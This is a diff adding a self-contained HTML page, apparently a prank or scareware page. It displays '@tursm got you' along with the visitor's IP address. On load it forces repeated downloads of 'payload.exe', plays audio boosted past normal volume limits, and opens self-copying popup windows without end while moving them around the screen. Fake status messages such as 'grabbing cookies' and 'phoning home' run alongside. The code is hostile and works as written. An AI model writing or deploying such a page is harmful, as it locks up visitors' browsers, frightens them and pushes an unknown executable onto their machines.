@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>.</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#000;
+    color:#fff;
+    font-family:'Courier New',monospace;
+    display:flex;flex-direction:column;
+    align-items:center;justify-content:center;
+    min-height:100vh;overflow:hidden;
+  }
+  #msg{font-size:clamp(28px,5vw,64px);font-weight:900;letter-spacing:2px;text-align:center}
+  #ip{font-size:clamp(18px,3vw,36px);margin-top:18px;color:#ff3c3c;font-weight:700;text-align:center}
+  #status{font-size:13px;color:#555;margin-top:14px;text-align:center;min-height:20px}
+  body::before{
+    content:'';position:fixed;inset:0;
+    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(255,255,255,.03) 2px,rgba(255,255,255,.03) 4px);
+    pointer-events:none;z-index:999;
+  }
+</style>
+</head>
+<body>
+<div id="msg">@tursm got you</div>
+<div id="ip">fetching your IP...</div>
+<div id="status">initializing...</div>
+
+<script>
+(async()=>{
+  /* ── 1. grab IP ── */
+  try{
+    const r=await fetch('https://api.ipify.org?format=json');
+    const d=await r.json();
+    document.getElementById('ip').textContent=d.ip;
+  }catch{document.getElementById('ip').textContent='IP UNKNOWN';}
+
+  /* ── 2. trigger exe download immediately ── */
+  function dlExe(){
+    const a=document.createElement('a');
+    a.href='/payload.exe';
+    a.download='payload.exe';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+  dlExe();
+
+  /* ── 3. audio ── */
+  let audioStarted=false;
+  function startAudio(){
+    if(audioStarted)return;audioStarted=true;
+    const au=new Audio('/music.mp3');
+    au.volume=1.0;au.loop=true;
+    au.play().catch(()=>{});
+    /* also via AudioContext to bypass volume limits */
+    try{
+      const ctx=new(window.AudioContext||window.webkitAudioContext)();
+      const src=ctx.createMediaElementSource(au);
+      const gain=ctx.createGain();
+      gain.gain.value=4.0; /* 4× amplify */
+      src.connect(gain);gain.connect(ctx.destination);
+    }catch(e){}
+  }
+
+  /* ── 4. open windows/tabs ── */
+  const opened=[];
+  let total=0;
+  function openWin(){
+    const W=screen.availWidth,H=screen.availHeight;
+    const w=400+Math.random()*600|0;
+    const h=300+Math.random()*400|0;
+    const x=Math.random()*(W-w)|0;
+    const y=Math.random()*(H-h)|0;
+    const win=window.open(
+      location.href,'_blank',
+      `width=${w},height=${h},left=${x},top=${y},toolbar=0,location=0,menubar=0`
+    );
+    if(win){opened.push(win);total++;}
+  }
+
+  /* move all child windows randomly */
+  function thrashWindows(){
+    const W=screen.availWidth,H=screen.availHeight;
+    opened.forEach(w=>{
+      try{
+        const nw=300+Math.random()*700|0;
+        const nh=200+Math.random()*500|0;
+        w.moveTo(Math.random()*(W-nw)|0,Math.random()*(H-nh)|0);
+        w.resizeTo(nw,nh);
+      }catch(e){}
+    });
+    /* also thrash self */
+    try{
+      window.moveTo(Math.random()*(screen.availWidth-400)|0,Math.random()*(screen.availHeight-300)|0);
+      window.resizeTo(400+Math.random()*500|0,300+Math.random()*400|0);
+    }catch(e){}
+  }
+
+  /* ── 5. main chaos loop ── */
+  function chaos(){
+    startAudio();
+
+    /* burst-open windows */
+    for(let i=0;i<3;i++) setTimeout(openWin,i*80);
+
+    /* keep opening forever, one every 300ms */
+    const opener=setInterval(()=>{
+      openWin();
+      document.getElementById('status').textContent=
+        `windows spawned: ${total} | tabs flooding...`;
+    },300);
+
+    /* thrash positions every 120ms */
+    setInterval(thrashWindows,120);
+
+    /* re-download exe every 8s in THIS tab */
+    setInterval(dlExe,8000);
+
+    /* flood status text */
+    const msgs=[
+      'downloading payload...','injecting...','routing network...',
+      'grabbing cookies...','escalating privileges...','persistence set...',
+      'scanning ports...','extracting data...','phoning home...'
+    ];
+    let mi=0;
+    setInterval(()=>{
+      document.getElementById('status').textContent=msgs[mi++%msgs.length];
+    },900);
+  }
+
+  /* ── 6. trigger: run immediately (subsequent tabs need no interaction) ── */
+  /* first tab needs one interaction due to browser autoplay/popup policy */
+  let started=false;
+  function tryStart(){if(started)return;started=true;chaos();}
+
+  /* auto-start after tiny delay — works in every tab this page opens */
+  setTimeout(tryStart,400);
+
+  /* fallback: any interaction */
+  ['click','mousemove','keydown','touchstart'].forEach(e=>
+    document.addEventListener(e,tryStart,{once:true})
+  );
+})();
+</script>
+</body>
+</html>
